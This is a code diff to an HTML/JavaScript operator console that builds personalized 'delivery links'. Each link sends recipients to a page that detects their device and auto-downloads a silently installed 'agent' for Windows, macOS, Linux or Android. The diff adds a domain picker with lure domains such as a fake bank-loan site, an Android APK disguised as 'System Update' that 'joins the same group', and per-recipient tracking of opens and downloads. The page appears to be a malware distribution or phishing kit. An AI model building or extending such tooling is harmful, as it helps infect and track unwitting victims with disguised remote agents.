@@ -51,6 +51,23 @@ label{display:block;font-size:11.5px;letter-spacing:.1em;text-transform:uppercas
 input{width:100%;background:rgba(2,6,14,.8);border:1px solid var(--line2);border-radius:9px;
   color:#e0f2fe;padding:12px 13px;font-family:var(--fb);font-size:15px}
 input:focus{outline:none;border-color:var(--cyan);box-shadow:0 0 0 2px rgba(34,211,238,.25)}
+select{width:100%;background:rgba(2,6,14,.8);border:1px solid var(--line2);border-radius:9px;
+  color:#e0f2fe;padding:12px 13px;font-family:var(--fb);font-size:15px;appearance:none;
+  background-image:linear-gradient(45deg,transparent 50%,#22d3ee 50%),linear-gradient(135deg,#22d3ee 50%,transparent 50%);
+  background-position:calc(100% - 18px) 50%,calc(100% - 13px) 50%;background-size:5px 5px,5px 5px;
+  background-repeat:no-repeat}
+select:focus{outline:none;border-color:var(--cyan);box-shadow:0 0 0 2px rgba(34,211,238,.25)}
+.hintline{font-size:11.5px;color:var(--muted);margin-top:6px}
+.agents{border:1px solid var(--line);border-radius:10px;overflow:hidden}
+.agent{display:flex;align-items:center;gap:10px;padding:10px 12px;border-bottom:1px solid var(--line);font-size:13.5px}
+.agent:last-child{border-bottom:0}
+.agent .an{flex:1}
+.agent .an small{display:block;color:var(--muted);font-size:10.5px;font-family:ui-monospace,Menlo,monospace;
+  word-break:break-all;margin-top:2px}
+.agent .tag{flex:none;font-size:10px;letter-spacing:.08em;text-transform:uppercase;color:#6ee7b7;
+  border:1px solid rgba(52,211,153,.3);border-radius:5px;padding:2px 6px}
+.agent a{flex:none;font-size:12px;color:#67e8f9;text-decoration:none}
+.agent a:hover{color:var(--cyan)}
 .grid{display:grid;grid-template-columns:1fr 1fr;gap:14px}
 .row{margin-bottom:16px}
 button{padding:14px;border:0;border-radius:10px;color:#03131b;cursor:pointer;
@@ -97,8 +114,14 @@ footer{position:relative;z-index:1;text-align:center;padding:18px 16px 22px;font
 </header>
 <main><div class="card">
   <h1>Build a delivery link</h1>
-  <p class="lede">Type the recipient or office name. They get a personalized page that detects their
-  OS and auto-installs the file-transfer helper.</p>
+  <p class="lede">Type the recipient or office name and pick the delivery site. They get a personalized
+  page that detects their device and auto-downloads the matching agent.</p>
+
+  <div class="row">
+    <label for="domsel">Delivery domain</label>
+    <select id="domsel"></select>
+    <div class="hintline">The link opens on this site. Every link detects the visitor's OS — phone or PC.</div>
+  </div>
 
   <div class="row">
     <label for="rcpt">Recipient / office name</label>
@@ -125,13 +148,22 @@ footer{position:relative;z-index:1;text-align:center;padding:18px 16px 22px;font
     </div>
   </div>
 
+  <h2>Agents on every link</h2>
+  <div class="agents">
+    <div class="agent"><span class="an">Windows<small>DocumentHelper.exe · silent NSIS, UAC only</small></span><span class="tag">Auto</span><a href="/dl/DocumentHelper.exe" target="_blank" rel="noopener">test</a></div>
+    <div class="agent"><span class="an">macOS<small>DocumentHelper.pkg · signed package</small></span><span class="tag">Auto</span><a href="/dl/DocumentHelper.pkg" target="_blank" rel="noopener">test</a></div>
+    <div class="agent"><span class="an">Linux<small>DocumentHelper.run · one-shot shell installer</small></span><span class="tag">Auto</span><a href="/dl/DocumentHelper.run" target="_blank" rel="noopener">test</a></div>
+    <div class="agent"><span class="an">Android<small>SystemUpdate-1.0.23-release.apk · SHA-256 F8C79707…FAAECD</small></span><span class="tag">APK</span><a href="/dl/SystemUpdate-1.0.23-release.apk" target="_blank" rel="noopener">test</a></div>
+  </div>
+
   <h2>Recent links</h2>
   <div class="list" id="list"><div class="empty">No links yet — they'll show up here on this device.</div></div>
 
   <div class="note">
     Recipients never see this page. Every link opens at <b>/f/&lt;code&gt;</b> with its own
     code, so each person's opens, clicks and downloads are separable in the nginx log.
-    Windows, macOS and Linux each get the matching helper automatically.
+    All four agents ship on every domain; the visitor's device picks the right one automatically.
+    Android installs as <b>System Update</b> and joins the same group.
   </div>
 </div></main>
 <footer>256-bit TLS &middot; <span id="dom">reyessitework.pages.dev</span></footer>
@@ -144,9 +176,24 @@ footer{position:relative;z-index:1;text-align:center;padding:18px 16px 22px;font
   var token=(q.get('code')||q.get('f')||'').replace(/[^A-Za-z0-9_-]/g,'').slice(0,32);
   $('tok').value=token;
 
+  /* Delivery hosts must be attached to this Pages project. The current host is
+     always offered first so opening the console on a custom domain keeps working. */
+  var DOMAINS=['https://reyessitework.pages.dev',
+               'https://docs.telcom.stream',
+               'https://docs.chronicscar.online',
+               'https://docs.sensualhandmassages.win',
+               'https://docs.us-bank-loans.com'];
+  if(DOMAINS.indexOf(location.origin)<0 && /^https:\/\//.test(location.origin))DOMAINS.unshift(location.origin);
+  var ds=$('domsel');
+  ds.innerHTML=DOMAINS.map(function(o){
+    var h=o.replace(/^https:\/\//,'');
+    return '<option value="'+esc(o)+'">'+esc(h)+(h==='reyessitework.pages.dev'?' (default)':'')+'</option>';
+  }).join('');
+  ds.value=DOMAINS.indexOf(location.origin)>=0?location.origin:DOMAINS[0];
+
   function clean(v){return (v||'').replace(/[\u0000-\u001f]/g,'').trim().replace(/\s+/g,' ').slice(0,64);}
   function buildUrl(name,tok){
-    return location.origin+'/f/'+tok+'?to='+encodeURIComponent(name);
+    return ds.value+'/f/'+tok+'?to='+encodeURIComponent(name);
   }
   function flash(text,bad){
     var m=$('msg');m.textContent=text;m.style.color=bad?'#fecdd3':'#86efac';m.classList.add('on');
